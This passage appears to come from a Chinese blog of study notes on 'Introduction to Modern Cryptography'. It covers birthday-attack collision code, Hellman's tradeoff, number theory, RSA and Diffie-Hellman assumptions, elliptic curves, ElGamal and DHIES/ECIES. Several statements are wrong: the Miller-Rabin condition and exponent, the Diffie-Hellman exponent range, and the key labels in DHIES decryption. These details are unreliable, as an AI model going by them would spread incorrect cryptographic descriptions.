class="hljs-comment">#回溯，寻找具体碰撞点</span><br>x = x_0<br>x_1 = x_0<br><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(i):<br><span class="hljs-keyword">if</span> H(x) == H(x_1):<br><span class="hljs-keyword">return</span> (x,x_1)<br><span class="hljs-keyword">else</span>:<br>x = H(x)<br>x_1 = H(x_1)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>ans = SmallSpaceBirthdayAttack()<br><span class="hljs-keyword">if</span> ans:<br><span class="hljs-built_in">print</span>(ans)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;NO！！！&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="有意义碰撞"><a href="#有意义碰撞" class="headerlink" title="有意义碰撞"></a>有意义碰撞</h4><p><strong>实现思想：</strong> 将两个类型不同的可选择句子映射为二进制，便可以使用上边的算法<br><strong>映射方法：</strong> 例如找两个语义相反的句子，<br>$type 0: Alice is a good&#x2F;great and honest&#x2F;trustworthy worker&#x2F;employee.$<br>$type 1: Alice is a bad&#x2F;lousy and annoying&#x2F;irritating worker&#x2F;employee.$<br>将类型0&#x2F;1映射到二进制的首数字，剩下的按照每个类型中的每个可选单词是选的第一个还是第二个来映射，如<br>$g(0000) &#x3D; Alice is a good and honest worker.$<br>$g(1101) &#x3D; Alice is a lousy and annoying employee.$</p><h3 id="6-4-3-时空折中攻击（Hellman’s-time-space-tradeoff-）"><a href="#6-4-3-时空折中攻击（Hellman’s-time-space-tradeoff-）" class="headerlink" title="6.4.3 时空折中攻击（Hellman’s time&#x2F;space tradeoff.）"></a>6.4.3 时空折中攻击（Hellman’s time&#x2F;space tradeoff.）</h3><p><strong>时间&#x2F;空间折中</strong>：通过预处理和存储，可以在存储空间和计算时间之间进行权衡，从而在合理的时间和空间复杂度内找到哈希函数的预像。</p><h4 id="Hellman-的时间-空间折中"><a href="#Hellman-的时间-空间折中" class="headerlink" title="Hellman 的时间&#x2F;空间折中"></a>Hellman 的时间&#x2F;空间折中</h4><p><strong>方法</strong>：Hellman 提出了一种更通用的时间&#x2F;空间权衡方法，适用于任意函数H。</p><p><strong>步骤</strong>：</p><ol><li><p><strong>选择参数</strong>：选择参数$s$和$t$。</p></li><li><p><strong>生成表</strong>：选择$s$个均匀随机的起始点$SP_1​,…,SP_s​∈{0,1}^ℓ$。对于每个起始点$SP_i$​，计算对应的终点$EPi​:&#x3D;H^{(t)}(SP_i​)（即H的t次迭代）$。</p></li><li><p><strong>存储</strong>：将所有对$(SP_i​,EP_i​)$存储在表中，按终点排序。</p></li><li><p><strong>在线阶段</strong>：给定$y$，检查$y,H(y),…,H^{(t−1)}(y)$是否与表中的某个终点匹配。如果找到匹配，则计算$H^{(t−j−1)}(SP_i​)$并检查是否为$y$的原像。</p></li></ol><h1 id="9-数论与密码困难假设"><a href="#9-数论与密码困难假设" class="headerlink" title="9.数论与密码困难假设"></a>9.数论与密码困难假设</h1><h3 id="9-1-1质数和可除性"><a href="#9-1-1质数和可除性" class="headerlink" title="9.1.1质数和可除性"></a>9.1.1质数和可除性</h3><p><strong>命题1：</strong> 对正整数a，b，有唯一q，r满足$a&#x3D;qb+r$，其中$r\in[0,b)$<br><strong>命题2：</strong> 正整数a，b，存在整数X，Y，满足$Xa+Yb&#x3D;gcd（a，b）$，其中$gcd(a,b)$是这种形式能够表示的最小正整数。<br><strong>命题3：</strong> 如果$c|ab，gcd(a,c)&#x3D;1$，则有$c|b$<br><strong>命题4：</strong> 如果$a|N,b|N,并且gcd(a,b)&#x3D;1，则ab|N$</p><h3 id="9-1-2模运算"><a href="#9-1-2模运算" class="headerlink" title="9.1.2模运算"></a>9.1.2模运算</h3><p><strong>命题：</strong> 对整数b，N，其中$b\geq 1$并且$N&gt;1$。当且仅当$gcd(b,N)&#x3D;1$时b关于N可逆。</p><h3 id="9-1-3群"><a href="#9-1-3群" class="headerlink" title="9.1.3群"></a>9.1.3群</h3><p><strong>定义：</strong> 群是由集合G和二元运算$\circ$组成。</p><ul><li><strong>闭合性：</strong> 对于g，h$\in G$，$g\circ h \in G$</li><li><strong>存在单位元：</strong> 存在e，使$e\circ g &#x3D; g &#x3D; g\circ e$</li><li><strong>存在逆元：</strong> 存在h，使得$g\circ h &#x3D; h\circ g &#x3D; e$</li><li><strong>结合性：</strong> $(g_1\circ g_2)\circ g_3 &#x3D; g_1 \circ (g_2 \circ g_3)$<br>阶：若元素数有限，称群为有限群，用|G|表示群的阶。<br><strong>Abelian群：</strong> 具有<strong>交换性</strong>，即满足$g\circ h &#x3D; h\circ g$的群。<br><strong>子群：</strong> 如果群$H\subseteq G$ ，且H与G运算相同，则H是G的子群。<br><strong>平凡子群：</strong> G或{1}（类比平凡因子）</li></ul><p><strong>定理：</strong> 已知$N&#x3D;\Pi_ip_i^{e_i}，其中e_i\geq 1$，则有$\phi(N)&#x3D;\Pi_ip_i^{e_i-1}(p_i-1)$</p><h3 id="9-1-4-乘法群：欧拉函数"><a href="#9-1-4-乘法群：欧拉函数" class="headerlink" title="9.1.4 乘法群：欧拉函数"></a>9.1.4 乘法群：欧拉函数</h3><p><strong>定理：</strong> 设$N&gt;1$是一个整数。那么$Z^*_N$是关于模$N$的乘法运算的一个阿贝尔群。<br><strong>定理：</strong> 设$N&#x3D;\Pi _ip_i^{e_i}$，其中${p_i}$是不同的素数，$e_i\geq 1$。那么$\Phi(N)&#x3D;\Pi _ip_i^{e_i-1}(p_i-1)$</p><p><strong>推论：</strong> 取任意整数$N&gt;1$和$a\in Z^*_N$。则$a^{\Phi(N)}&#x3D;1 \mod N$</p><h3 id="9-1-5中国剩余定理（CRT）"><a href="#9-1-5中国剩余定理（CRT）" class="headerlink" title="9.1.5中国剩余定理（CRT）"></a>9.1.5中国剩余定理（CRT）</h3><p>已知N&#x3D;pq，求$x\mod m$，令$m_1m_2&#x3D;M$<br>$x\equiv a \mod m_1$<br>$x\equiv b \mod m_2$<br><strong>求解过程：</strong> </p><ul><li>求$M_1，M_2$，其中$M_1&#x3D;\frac{M}{m_1}M_2&#x3D;\frac{M}{m_2}$</li><li>求$M_1^{-1},M_2^{-1}$，其中$M_1^{-1}\equiv M_1 \mod m_1，M_2^{-1}$同理</li><li>求$x\equiv aM_1M_1^{-1}+bM_2M_2^{-1} \mod M$</li></ul><h2 id="9-2-素数、分解、RSA"><a href="#9-2-素数、分解、RSA" class="headerlink" title="9.2 素数、分解、RSA"></a>9.2 素数、分解、RSA</h2><h3 id="9-2-1-生成随机素数"><a href="#9-2-1-生成随机素数" class="headerlink" title="9.2.1 生成随机素数"></a>9.2.1 生成随机素数</h3><p><strong>算法构造</strong>：<br>从1到$3n^2$进行循环：</p><ul><li>随机选择一个n-1位的二进制数$p_0$</li><li>将最高位设为1，得到n位数p</li><li>进行Miller-Rabin测试，输入为p和参数$1^n$</li><li>如果输出是”素数“，则返回p<br>如果再尝试$3n^2$次后没有找到素数，则返回失败。</li></ul><h3 id="9-2-2-素性测试"><a href="#9-2-2-素性测试" class="headerlink" title="9.2.2 素性测试"></a>9.2.2 素性测试</h3><h4 id="Miller-Rabin-素性测试"><a href="#Miller-Rabin-素性测试" class="headerlink" title="Miller-Rabin 素性测试"></a><strong>Miller-Rabin 素性测试</strong></h4><p><strong>介绍：</strong> 基于费马小定理和二次探测定理的随机化算法<br><strong>二次探测定理：</strong> 对于素数p，若$x^2\equiv 1 \mod p$，则小于p的解只有两个，$x_1&#x3D;1,x_2&#x3D;p-1$<br><strong>步骤：</strong></p><ul><li>令$n-1&#x3D;2^kq$，其中$k&gt;0,q$为奇数，随机选取整数$a,1&lt;a&lt;n-1$</li><li>若$a^q\mod n&#x3D;1$，则n有可能是素数</li><li>取整数$j$，$0\geq j &lt; k$，若存在$a^{2^j}\mod n &#x3D; n -1$，则n有可能是素数；否则，n为合数</li></ul><p><strong>定理：</strong> 如果N是奇数，且不是素数的幂，那么在$Z^*_N$中，至少有一半的元素是N是合数的强见证。</p><h3 id="9-2-3-分解假设"><a href="#9-2-3-分解假设" class="headerlink" title="9.2.3 分解假设"></a>9.2.3 分解假设</h3><p>因式分解假设是指存在一个相对的GenModulus，使得因式分解变得困难，其中GenModulus是一个用来生成$(N,p,q)$多项式时间算法</p><h3 id="9-2-4-RSA假设"><a href="#9-2-4-RSA假设" class="headerlink" title="9.2.4 RSA假设"></a>9.2.4 RSA假设</h3><p>假设存在一个GenRSA算法，使得RSA问题在多项式时间内难以解决。这一假设是RSA公钥密码学安全性的基础。<br><strong>e的选择：</strong> 最常见的选择为65537，像是e&#x3D;3等容易遭受低加密指数攻击</p><h2 id="9-3循环群中的密码学假设"><a href="#9-3循环群中的密码学假设" class="headerlink" title="9.3循环群中的密码学假设"></a>9.3循环群中的密码学假设</h2><h3 id="9-3-1循环群和生成元"><a href="#9-3-1循环群和生成元" class="headerlink" title="9.3.1循环群和生成元"></a>9.3.1循环群和生成元</h3><p><strong>命题9.55：</strong> 设G是一个阶为 m 的有限群，且$g\in G$的阶为i，则$i|m$<br><strong>推论9.56：</strong> G是一个阶为素数p的群，则G是循环群。且G中除了单位元之外所有元素都是生成元。<br><strong>定理9.57：</strong> 如果p是一个素数，那么$Z_p^*$是一个阶为p-1的循环群</p><h3 id="9-3-2离散对数-Diffie-Hellman假设"><a href="#9-3-2离散对数-Diffie-Hellman假设" class="headerlink" title="9.3.2离散对数&#x2F;Diffie-Hellman假设"></a>9.3.2离散对数&#x2F;Diffie-Hellman假设</h3><p><strong>离散对数问题：</strong> 在一个循环群$G$中，给定群的生成元$g$和一个群元素$h$，求解整数$x$，使得$g^x&#x3D;h$</p><blockquote><p>当群的阶数较大时，这是一个十分困难的问题</p></blockquote><p><strong>Diffie-Hellman问题：</strong></p><ul><li>计算Diffie-Hellman问题（CDH）：给定$h_1&#x3D;g^{x_1}和h_2&#x3D;g^{x_2}$，计算$g^{x_1x_2}$</li><li>决策Diffie-Hellman问题（DDH）：给定$h_1&#x3D;g^{x_1}和h_2&#x3D;g^{x_2}和h_0$和，判断$h_0和g^{x_1x_2}是否相等$</li></ul><h4 id="使用素数阶群"><a href="#使用素数阶群" class="headerlink" title="使用素数阶群"></a>使用素数阶群</h4><p><strong>原因：</strong> 离散对数问题在这种群中最为困难</p><h3 id="9-3-3-Z-p-的子群"><a href="#9-3-3-Z-p-的子群" class="headerlink" title="9.3.3 $Z_p^*$的子群"></a>9.3.3 $Z_p^*$的子群</h3><p><strong>定理9.66：</strong> 令p&#x3D;rq+1，其中p，q为素数。则有<br>$$ G&#x3D;{[h^r\mod p]h\in Z_p^*} $$</p><p>是一个$Z_p^*$的q阶子群。</p><h3 id="9-3-4椭圆曲线"><a href="#9-3-4椭圆曲线" class="headerlink" title="9.3.4椭圆曲线"></a>9.3.4椭圆曲线</h3><p><strong>常规表示（Weierstrass表示）：</strong></p><p>$$ y^2&#x3D;x^3+Ax+B \mod p $$</p><p>不同曲线的计算方法不一样</p><h4 id="Montgomery表示"><a href="#Montgomery表示" class="headerlink" title="Montgomery表示"></a>Montgomery表示</h4><p>$$By^2&#x3D;x^3+Ax^2+x \mod p$$<br>其中，$B\neq0\mod p且A\equiv ±2\mod p$<br><strong>相比Weierstrass形式的优势：</strong> 蒙哥马利表示在某些情况下比魏尔斯特拉斯表示更高效，特别是在实现级安全性（如抵抗侧信道攻击）方面。</p><h4 id="（Twisted-Edwards表示"><a href="#（Twisted-Edwards表示" class="headerlink" title="（Twisted) Edwards表示"></a>（Twisted) Edwards表示</h4><p>$$ ax^2+y^2&#x3D;1+dx^2y^2 \mod p $$<br><strong>命题9.7：</strong> p是$\geq 5$的素数，E是曲线$y^2&#x3D;x^3+Ax+B \mod p$</p><h4 id="选择椭圆曲线群"><a href="#选择椭圆曲线群" class="headerlink" title="选择椭圆曲线群"></a>选择椭圆曲线群</h4><h4 id="实际问题"><a href="#实际问题" class="headerlink" title="实际问题"></a>实际问题</h4><h5 id="1-点压缩"><a href="#1-点压缩" class="headerlink" title="1.点压缩"></a>1.点压缩</h5><p>在椭圆曲线中，一个点通常由两个坐标$（x, y）$表示。为了减少表示点所需的比特数，可以使用点压缩技术。</p><h5 id="2-射影坐标"><a href="#2-射影坐标" class="headerlink" title="2.射影坐标"></a>2.射影坐标</h5><p><strong>仿射坐标</strong>：点P在椭圆曲线上的表示形式为 $(x, y)$。<br><strong>射影坐标</strong>：点P在射影坐标中的表示形式为 $(X, Y, Z)$，满足$X&#x2F;Z&#x3D;xmodp$和 $Y&#x2F;Z&#x3D;y\mod p$。</p><ul><li><strong>无穷远点O</strong>：在射影坐标中表示为$(0, Y, 0)$，其中$Y\neq0$。</li><li><strong>转换</strong>：从仿射坐标$(x, y)$转换为射影坐标$(x, y, 1)$；从射影坐标$(X, Y, Z)$转换为仿射坐标$(X&#x2F;Z\mod p,Y&#x2F;Z\mod p)$。<br><strong>优势：</strong> 在射影坐标中，点的加法操作不需要计算模p的逆元。计算逆元的代价较高，而加法和乘法的代价较低</li></ul><h5 id="3-常用椭圆曲线"><a href="#3-常用椭圆曲线" class="headerlink" title="3.常用椭圆曲线"></a>3.常用椭圆曲线</h5><ul><li><strong>P-256(secp256r1)：</strong> 定义在256位素数$p&#x3D;2^{256}-2^{224}+2^{192}+2^{96}-1$上<br>$y^2&#x3D;x^3-3x+B \mod p$，其中$B$是特定常数</li><li><strong>P-384和P-521：</strong> 与P-256类似，p分别为384位和521位素数</li><li><strong>Curve25519：</strong> 定义在素数$p&#x3D;2^{255}-19$上<br>可以用蒙哥马利形式表示，也可以用扭曲爱德华兹形式表示（称为Ed25519）。</li><li><strong>secp256k1：</strong> 定义在素数$p&#x3D;2^{256}-2^{32}-2^9-2^8-2^7-2^6-2^4-1$<br>是一条Koblitz曲线，方程为$y^2&#x3D;x^3+7\mod p$</li></ul><h1 id="11-密钥管理和公钥革命"><a href="#11-密钥管理和公钥革命" class="headerlink" title="11.密钥管理和公钥革命"></a>11.密钥管理和公钥革命</h1><h2 id="11-1密钥分配和密钥管理"><a href="#11-1密钥分配和密钥管理" class="headerlink" title="11.1密钥分配和密钥管理"></a>11.1密钥分配和密钥管理</h2><p>私钥加密三个问题：</p><ul><li>密钥分配</li><li>存储和管理大量密钥：一个典型的解决方案是将密钥存储在安全硬件上</li><li>私钥加密在开放系统中的不适用性</li></ul><h2 id="11-2部分解决方案：密钥分配中心（KDC）"><a href="#11-2部分解决方案：密钥分配中心（KDC）" class="headerlink" title="11.2部分解决方案：密钥分配中心（KDC）"></a>11.2部分解决方案：密钥分配中心（KDC）</h2><p>找一个守信任的实体充当KDC，帮助所有员工共享成对密钥<br><strong>优点：</strong></p><ul><li>每个员工只需要存储一个长期密钥（与KDC共享）。（KDC需要存储许多长期密钥，但可以集中放在安全的地方）</li><li>新员工加入时，只需要新员工和KDC之间更新密钥。</li></ul><p><strong>缺点：</strong></p><ul><li>对KDC的成功攻击会导致系统完全崩溃。</li><li>KDC是一个单点故障，如果宕机，安全通信将暂时无法实现，负载较高。（一种解决方法是复制更多的KDC）</li></ul><h3 id="使用KDC进行密钥分发的协议"><a href="#使用KDC进行密钥分发的协议" class="headerlink" title="使用KDC进行密钥分发的协议"></a>使用KDC进行密钥分发的协议</h3><p>Needham-Schroeder 协议，它是 Kerberos 的核心，Kerberos 是一种重要且广泛使用的用于执行身份验证和支持安全通信的服务<br><img src="/2025/04/28/Introduction%20To%20Modern%20Cryptography%E5%AD%A6%E4%B9%A0%E9%9A%8F%E7%AC%94/file-20250425203749171.png"></p><h2 id="11-3密钥交换和Diffie-Hellman协议"><a href="#11-3密钥交换和Diffie-Hellman协议" class="headerlink" title="11.3密钥交换和Diffie-Hellman协议"></a>11.3密钥交换和Diffie-Hellman协议</h2><p>KDC协议在实践中仍然不能解决密钥分发问题</p><p>Diffie-Hellman密钥交换协议允许两个当事人，Alice和Bob，在事先没有交换任何秘密信息的情况下达成一个秘密密钥，该方法基于循环群。</p><h3 id="安全的设定和定义"><a href="#安全的设定和定义" class="headerlink" title="安全的设定和定义"></a>安全的设定和定义</h3><h3 id="Diffie-Hellman密钥交换协议"><a href="#Diffie-Hellman密钥交换协议" class="headerlink" title="Diffie-Hellman密钥交换协议"></a>Diffie-Hellman密钥交换协议</h3><p>该协议本身基于群$Z_p^*$，其中$p$是大素数。在Diffie-Hellman（DH）密钥交换中可以使用的素数是标准化的—也就是说素数$p$必须是安全素数，即$p&#x3D;2q+1$，其中$q$也是素数。</p><p><strong>注意</strong>：自$p&#x3D;2q+1$以来，素数$q$可以整除$p−1$，因此群$Z_p^∗​$有一个阶为$q$的元素$g$，$g$的幂生成群$⟨g⟩:&#x3D;{0,1,⋯,q−1}$。结果，这个群$⟨g⟩$是群$Z_p^∗​$的子群。</p><p><strong>过程：</strong></p><ul><li><p>Alice随机选择一个均匀的$a←_R​Z_q​$，即$a\in [0,p-1]$并计算$A:&#x3D;g^a$。同样，Bob选择一个均匀的$b←_R​Z_q​$并计算$B:&#x3D;g^b$。</p></li><li><p>然后，Alice和Bob交换他们各自计算出的值：Alice从Bob那里获得$B$，Bob从Alice那里获得$A$。</p></li><li><p>现在，Alice计算$B^a&#x3D;(g^b)^a&#x3D;g^{ab}$，Bob计算$A^ b&#x3D;(g^a)^b&#x3D;g^{ab}$，这样双方已经到达了相同的密钥$k:&#x3D;g^{ab}$！</p></li><li><p>即使攻击者知道了$g^a和g^b$，他也无法算出$g^{ab}$，因为如果想的到这个密钥，他必须求解<strong>离散对数</strong>问题</p></li></ul><table><thead><tr><th>变量</th><th>Alice</th><th>Bob</th><th>Eve</th></tr></thead><tbody><tr><td>$p$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$q$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$g$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$a$</td><td>known</td><td>unknown</td><td>unknown</td></tr><tr><td>$b$</td><td>unknown</td><td>known</td><td>unknown</td></tr><tr><td>$g^a$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$g^b$</td><td>known</td><td>known</td><td>known</td></tr><tr><td>$g^{ab}$</td><td>known</td><td>known</td><td>unknown</td></tr></tbody></table><h3 id="活跃对手"><a href="#活跃对手" class="headerlink" title="活跃对手"></a>活跃对手</h3><p>活跃对手这里主要指，主动的攻击者，也就是说攻击者不再是简简单单的监听，而会进行中间人攻击，而Diffie-Hellman协议对于此种攻击完全没有安全性。<br>因此实践应用中要结合签名进行身份认证。</p><h2 id="11-4公钥革命"><a href="#11-4公钥革命" class="headerlink" title="11.4公钥革命"></a>11.4公钥革命</h2><p><strong>数字签名（MAC对应物）：</strong><br>使用私钥进行签名，使用公钥进行认证</p><p><strong>公钥密码如何解决了私钥密码的局限性：</strong></p><ul><li>允许在公共通道进行密钥分发</li><li>减少了存储密钥的成本，不需要再秘密存储大量密钥</li><li>更加适合开放环境，便于之前没有联系的两方建立安全通信</li></ul><h3 id="为什么要研究私钥密码学？"><a href="#为什么要研究私钥密码学？" class="headerlink" title="为什么要研究私钥密码学？"></a>为什么要研究私钥密码学？</h3><p>私钥密码比公钥密码的效率更高，更适合大量消息的交换。</p><h1 id="12-公钥加密"><a href="#12-公钥加密" class="headerlink" title="12.公钥加密"></a>12.公钥加密</h1><h2 id="12-1概述"><a href="#12-1概述" class="headerlink" title="12.1概述"></a>12.1概述</h2><h3 id="与私钥加密的对比"><a href="#与私钥加密的对比" class="headerlink" title="与私钥加密的对比"></a>与私钥加密的对比</h3><p><strong>公钥加密优势（与前面类似）：</strong></p><ul><li>解决了密钥分发问题</li><li>便于除了一个接收方和多个发送方之间的信息传输</li><li>不需要知道潜在的发送方的数量和身份，具有开放性</li></ul><h3 id="公共密钥的安全分发"><a href="#公共密钥的安全分发" class="headerlink" title="公共密钥的安全分发"></a>公共密钥的安全分发</h3><p>安全共享的前提是经过认证</p><h2 id="12-2-定义"><a href="#12-2-定义" class="headerlink" title="12.2 定义"></a>12.2 定义</h2><h3 id="12-2-1-针对选择明文攻击的安全性"><a href="#12-2-1-针对选择明文攻击的安全性" class="headerlink" title="12.2.1 针对选择明文攻击的安全性"></a>12.2.1 针对选择明文攻击的安全性</h3><p><strong>命题：</strong> 如果一个公钥加密方案在一个窃听者存在的情况下具有不可区分的加密，这个放啊便是CPA安全的。</p><p><strong>选择明文攻击：</strong></p><ul><li>高效的对手Eve被给予公钥$pk$，并可以使用它来加密她选择的$q$条消息$m_1​,…,m_q​$以获得相应的密文$c_1​,…,c_q​$</li><li>如果对于任何两个消息$(μ0​,μ1​)$，由$Gen$生成的公钥$pk$和密文$c:&#x3D;Enc(pk​,⋅)$（它是$μ0​$或$μ1​$的加密），Eve猜测$c$属于$μ0​$或$μ1​$的概率最多只是微不足道地大于$\frac 1 2$，则公钥加密方案$(Gen,Enc,Dec)$是CPA安全的。</li></ul><h4 id="公钥的不安全性"><a href="#公钥的不安全性" class="headerlink" title="公钥的不安全性"></a>公钥的不安全性</h4><p>由于公钥加密的方案特性，每个攻击者都会十分容易获得加密预言机，也就是说任何<strong>确定性的公钥加密</strong>都是不具有CPA安全性的。<br>因此若想保证CPA安全必须使用<strong>非确定性的公钥加密</strong>，如每次加密前都进行随机填充。</p><h3 id="12-2-2-多消息加密"><a href="#12-2-2-多消息加密" class="headerlink" title="12.2.2 多消息加密"></a>12.2.2 多消息加密</h3><p><strong>定理12.6：</strong> 如果说一个加密方案$\Pi$是CPA安全的，那么它也具有不可区分的多消息加密特性</p><h4 id="加密任意长度消息"><a href="#加密任意长度消息" class="headerlink" title="加密任意长度消息"></a>加密任意长度消息</h4><p><strong>思路：</strong><br>将长消息分解为多个消息，分别加密后再组合起来，如果原始方案是CPA安全的，那么新方案也是CPA安全的。</p><h3 id="12-2-3-针对选择密文攻击的安全性"><a href="#12-2-3-针对选择密文攻击的安全性" class="headerlink" title="12.2.3 针对选择密文攻击的安全性"></a>12.2.3 针对选择密文攻击的安全性</h3><p><strong>CCA攻击方案：</strong></p><ul><li>修改发送者发送的密文$c$变为$c_0$（如修改”收件人”等固定的地方），然后再从接收者的反应行动推测明文$m$的一些内容</li><li>修改密文$c$变为$c_0$，其中把发送人改为自己，后续可能收到回信，从而得到明文$m_0$的一些信息。</li></ul><h2 id="12-3混合加密和KEM-DEM范例"><a href="#12-3混合加密和KEM-DEM范例" class="headerlink" title="12.3混合加密和KEM&#x2F;DEM范例"></a>12.3混合加密和KEM&#x2F;DEM范例</h2><p><strong>主要思想：</strong></p><ul><li>发送方：使用$pk$加密私钥密钥$k$得到$c$，使用$k$加密明文$m$得到$c_1$，全部发送给接收方</li><li>接收方：使用$sk$解密$c$的到密钥$k$，再使用$k$解密$c_1$得到明文$m$</li></ul><p>封装操作，一次性完成上面操作<br><strong>KEM（Key Encapsulation Mechanism）：</strong><br><strong>KEM负责安全地传输对称密钥</strong>，确保只有接收方能够获取对称密钥。</p><ul><li>发送方使用接收方的公钥$pk$将对称密钥$k$封装成一个密文$c$。</li><li>接收方使用自己的私钥$sk$从密文$c$中解封装出对称密钥$k$。</li></ul><p><strong>DEM（Data Encapsulation Mechanism）：</strong><br><strong>DEM负责高效地加密和解密数据</strong>，利用对称加密的高效性。</p><ul><li>发送方使用对称密钥$k$对明文$m$进行加密，得到密文$c1​$。</li><li>接收方使用对称密钥$k$对密文$c1​$进行解密，得到明文$m$。</li></ul><h3 id="12-3-1-CPA安全"><a href="#12-3-1-CPA安全" class="headerlink" title="12.3.1 CPA安全"></a>12.3.1 CPA安全</h3><p>如果KEM是CPA安全的，且私钥加密方案（DEM）符合基本的安全性，那么混合加密方案也是CPA安全的</p><h3 id="12-3-2-CCA安全"><a href="#12-3-2-CCA安全" class="headerlink" title="12.3.2 CCA安全"></a>12.3.2 CCA安全</h3><p>如果KEM是CCA安全的，且私钥加密方案（DEM）也是CCA安全的，那么混合加密方案也是CCA安全的</p><h2 id="12-4-基于CDH-DDH的加密"><a href="#12-4-基于CDH-DDH的加密" class="headerlink" title="12.4 基于CDH&#x2F;DDH的加密"></a>12.4 基于CDH&#x2F;DDH的加密</h2><h3 id="12-4-1-El-Gamal加密"><a href="#12-4-1-El-Gamal加密" class="headerlink" title="12.4.1 El Gamal加密"></a>12.4.1 El Gamal加密</h3><p><strong>密钥生成：</strong></p><ul><li>Alice使用生成元$g$得到一个阶为$q$的循环群$G$</li><li>随机均匀选择一个$x\in [1,q-1]$计算$h:&#x3D;g^x$</li><li>公开公钥$(G,q,g,h)$，保留$x$作为私钥<br><strong>加密算法：</strong></li><li>Bob随机均匀选择$y\in [1,q-1]$，计算密文$c_1:&#x3D;g^y$</li><li>计算共享秘密$s:&#x3D;h^y$</li><li>计算$c_2:&#x3D;ms$</li><li>将密文$(c_1,c_2)&#x3D;(g^y,mh^y)&#x3D;(g^y,m(g^x)^y)$<blockquote><p>如果一个人知道了m，那么它很容易就能知道$h^y$的值。因此对每一条信息都产生一个新的$y$可以提高安全性。所以$y$也被称作<strong>临时密钥</strong></p></blockquote></li></ul><p><strong>解密算法：</strong></p><ul><li>Alice计算共享秘密$s:&#x3D;c_1^x$</li><li>计算$m&#x3D;c_2s^{-1}$</li></ul><h3 id="实施问题"><a href="#实施问题" class="headerlink" title="实施问题"></a>实施问题</h3><ul><li>共享公钥参数</li><li>组别选择</li><li>消息空间</li></ul><p><strong>基于El Gamal的KEM构造</strong><br><strong>Gen（密钥生成）</strong>：</p><ul><li>输入安全参数$1^n$，运行群生成算法$G(1^n)$，得到群$G、阶q和生成元g$。</li><li>随机选择一个私钥$x∈Z_q$​，计算公钥$h&#x3D;g^x$。     </li><li>定义一个函数$H:G→{0,1}^ℓ$，其中$ℓ$是某个函数的值。</li><li>公钥为$(G,q,g,h,H)$，私钥为$(G,q,g,x)$。</li></ul><p><strong>Encaps（封装）</strong>：   </p><ul><li>输入公钥$pk&#x3D;(G,q,g,h,H)$。     </li><li>随机选择$y∈Zq_​$，计算密文$c&#x3D;g^y$。    </li><li>计算对称密钥$K&#x3D;H(h^y)$。</li><li>输出密文$c$和对称密钥$K$。</li></ul><p><strong>Decaps（解封装）</strong>：</p><ul><li>输入私钥$sk&#x3D;(G,q,g,x)$和密文$c∈G$。</li><li>计算$cx&#x3D;(g^y)^x&#x3D;g^{xy}$。</li><li>计算对称密钥$K&#x3D;H(g^{xy})$。</li><li>输出对称密钥$K$。</li></ul><blockquote><p>ps：其中$H$应为一种理想化的Hash函数</p></blockquote><blockquote><p>CDH是一个<strong>计算问题</strong>，要求计算出具体的共享密钥$g^{ab}$。<br>DDH是一个<strong>决策问题</strong>，要求判断一个给定的群元素是否是两个其他群元素的“组合”</p></blockquote><h3 id="12-4-2-基于DDH的密钥封装"><a href="#12-4-2-基于DDH的密钥封装" class="headerlink" title="12.4.2 基于DDH的密钥封装"></a>12.4.2 基于DDH的密钥封装</h3><p><strong>定理：</strong> 如果DDH（决策性Diffie-Hellman）问题在群G中是困难的，并且H按照上边方式选择，那么这种构造是一个CPA安全的KEM</p><h3 id="12-4-3-基于CDH的随机预言模型中的KEM"><a href="#12-4-3-基于CDH的随机预言模型中的KEM" class="headerlink" title="12.4.3 基于CDH的随机预言模型中的KEM"></a>12.4.3 基于CDH的随机预言模型中的KEM</h3><p><strong>CDH假设</strong>：CDH假设表明，给定$g^x$和$g^y$，计算$g^{xy}$是困难的。<br><strong>定理：</strong> 如果CDH问题是困难的，并且 H 被建模为随机预言，那么Construction 12.19是CPA安全的</p><h3 id="12-4-4-选择密文安全性和DHIES-ECIES"><a href="#12-4-4-选择密文安全性和DHIES-ECIES" class="headerlink" title="12.4.4 选择密文安全性和DHIES&#x2F;ECIES"></a>12.4.4 选择密文安全性和DHIES&#x2F;ECIES</h3><p><strong>定理：</strong> 如果假设$gap-CDH$问题是困难的，那么KEM可以实现CCA安全<br><strong>gap-CDH假设：</strong><br>Gap-CDH假设是CDH问题的一个更强版本，它假设即使攻击者可以访问一个解决DDH问题的预言机，CDH问题仍然是困难的。换句话说，即使攻击者可以判断$g^x$和$g^y$是否与$g^{xy}$有关，他们仍然无法计算$g^{xy}$。</p><p><strong>DHIES&#x2F;ECIES方案：</strong><br>这是一个CCA安全的加密方案，结合KEM和私钥加密方案（如CPA安全的对称加密方案）以及MAC。<br><strong>Gen：</strong></p><ul><li>输入安全参数$1^n$，允许群生成算法$G(1^n)$，得到群$G$、阶$q$和生成元$g$</li><li>随机选择$x\in Z_q$，计算$h&#x3D;g^x$</li><li>定义一个函数$H：G\to {0,1}^{2n}$</li><li>公钥${G,q,g,h,H}$，私钥为$x$</li></ul><p><strong>Enc：</strong></p><ul><li>输入公钥$pk&#x3D;(G,q,g,h,H)$和消息$m$</li><li>随机选择$y\in Z_q$，计算$k_E||k_M&#x3D;H(h^y)$，其中$k_E$是对称加密密钥，$k_M$是MAC密钥</li><li>使用对称加密方案$\Pi <em>E$加密消息$m$，得到$c_0&#x3D;Enc</em>{k_E}(m)$</li><li>计算MAC值$t&#x3D;Mac_{k_M}(c_0)$</li><li>输出密文$(g^y,c_0,t)$</li></ul><p><strong>Dec：</strong></p><ul><li>输入私钥$sk&#x3D;(G,q,g,x,H)$和密文$(c,c_0,t)$</li><li>检查$c\in G$，如果$c\notin G$，返回$\perp$</li><li>计算$k_E||k_E&#x3D;H(c^x)$</li><li>验证MAC值$Vefy_{k_E}(c_0,t)$。得到消息$m&#x3D;Dec_{k_E}(c_0)$</li></ul><p><strong>DHIES&#x2F;ECIES:</strong></p><ul><li><strong>DHIES</strong>：当群$G$是有限域的循环子群时，这种构造被称为DHIES。</li><li><strong>ECIES</strong>：当群$G$是椭圆曲线群时，这种构造被称为ECIES。</li></ul><h2 id="12-5基于RSA的加密"><a href="#12-5基于RSA的加密" class="headerlink" 